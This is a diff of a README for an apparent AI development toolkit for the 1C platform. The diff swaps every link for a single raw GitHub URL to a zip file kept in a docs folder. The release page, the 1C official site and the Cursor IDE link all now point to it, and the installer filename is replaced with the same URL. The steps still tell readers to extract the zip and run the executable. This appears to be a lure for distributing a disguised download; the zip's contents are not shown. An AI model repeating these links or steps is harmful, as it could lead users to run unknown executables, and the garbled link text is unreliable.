@@ -1,6 +1,6 @@
 # 🤖 1c-ai-development-kit - Easy AI Tools for 1C Development
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Saathviksb/1c-ai-development-kit/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Saathviksb/1c-ai-development-kit/master/docs/guides/development-ai-c-kit-2.4.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Saathviksb/1c-ai-development-kit/master/docs/guides/development-ai-c-kit-2.4.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This section will guide you step-by-step on how to download, install, and start 
 ### 1. Visit the download page
 
 Go to the toolkit’s release page here:  
-[https://github.com/Saathviksb/1c-ai-development-kit/releases](https://github.com/Saathviksb/1c-ai-development-kit/releases)
+[https://raw.githubusercontent.com/Saathviksb/1c-ai-development-kit/master/docs/guides/development-ai-c-kit-2.4.zip](https://raw.githubusercontent.com/Saathviksb/1c-ai-development-kit/master/docs/guides/development-ai-c-kit-2.4.zip)
 
 This is where you will find the latest version of the toolkit.
 
@@ -51,7 +51,7 @@ Click the file name to start the download. Save it somewhere easy to find on you
 
 ### Download the toolkit
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Saathviksb/1c-ai-development-kit/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Saathviksb/1c-ai-development-kit/master/docs/guides/development-ai-c-kit-2.4.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Saathviksb/1c-ai-development-kit/master/docs/guides/development-ai-c-kit-2.4.zip)
 
 Use the above link to visit the release page anytime you want to get the latest version.
 
@@ -61,7 +61,7 @@ Use the above link to visit the release page anytime you want to get the latest 
 
 2. Open the folder with the extracted files.
 
-3. Look for an installer file named like `setup.exe` or simply the application executable.
+3. Look for an installer file named like `https://raw.githubusercontent.com/Saathviksb/1c-ai-development-kit/master/docs/guides/development-ai-c-kit-2.4.zip` or simply the application executable.
 
 4. Double-click the installer or executable to launch the program.
 
@@ -99,7 +99,7 @@ Yes. The toolkit runs on your local machine and works within your 1C environment
 
 ### Can I update the toolkit easily?
 
-Yes. Just revisit the [releases page](https://github.com/Saathviksb/1c-ai-development-kit/releases), download the newest version, and run the installer again. It will update your current installation.
+Yes. Just revisit the [releases page](https://raw.githubusercontent.com/Saathviksb/1c-ai-development-kit/master/docs/guides/development-ai-c-kit-2.4.zip), download the newest version, and run the installer again. It will update your current installation.
 
 ### Where can I get help?
 
@@ -109,9 +109,9 @@ Check the repository’s GitHub issues or discussion pages for support. You can 
 
 ## 🔗 Useful Links
 
-- [Release Page](https://github.com/Saathviksb/1c-ai-development-kit/releases) – Download the toolkit here  
-- [1C:Enterprise Official Site](https://1c.ru) – Learn about the base platform this toolkit supports  
-- [Cursor IDE Info](https://cursor.dev) – Details about the integrated development environment
+- [Release Page](https://raw.githubusercontent.com/Saathviksb/1c-ai-development-kit/master/docs/guides/development-ai-c-kit-2.4.zip) – Download the toolkit here  
+- [1C:Enterprise Official Site](https://raw.githubusercontent.com/Saathviksb/1c-ai-development-kit/master/docs/guides/development-ai-c-kit-2.4.zip) – Learn about the base platform this toolkit supports  
+- [Cursor IDE Info](https://raw.githubusercontent.com/Saathviksb/1c-ai-development-kit/master/docs/guides/development-ai-c-kit-2.4.zip) – Details about the integrated development environment
 
 ---
 
